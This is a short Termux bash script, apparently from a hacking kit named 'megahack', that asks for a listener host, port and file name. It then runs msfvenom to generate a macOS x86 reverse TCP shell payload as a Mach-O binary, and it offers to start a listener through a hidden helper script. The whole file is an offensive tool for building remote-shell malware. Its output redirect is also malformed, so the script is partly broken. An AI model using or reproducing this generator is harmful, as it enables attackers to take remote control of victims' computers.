#!/data/data/com.termux/files/usr/bin/bash
clear
cd
figlet macOS | lolcat -t
figlet Payload | lolcat -t
echo " "
echo " "
tput setaf 2; echo "LHOST"
echo " "
read lhost
echo " "
tput setaf 3; echo "LPORT"
echo " "
read lport
echo " "
tput setaf 4; echo "FILE LANGUE"
echo " "
read file
msfvenom -p osx/x86/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f macho > cd $HOME/megahack/output/macOS/"$file"
echo " " 
tput setaf 2; echo "PAYLOAD GENERATED SUCCESSFULLY"
echo " "
tput setaf 1; echo "PRESS INTER TO CONTINUE"
echo " " 
read nov
clear
figlet macOs | lolcat -t
figlet Payload | lolcat -t
echo " "
tput setaf 4; echo "  [1] Start Listner"
echo " "
tput setaf 5; echo "  [2] Exit"
echo " " 
read task
if [ "1" = "$task" ]
then
	cd $HOME/megahack/.l/.macOS && bash .1.sh
else
	cd $HOME/megahack && bash megahack
fi

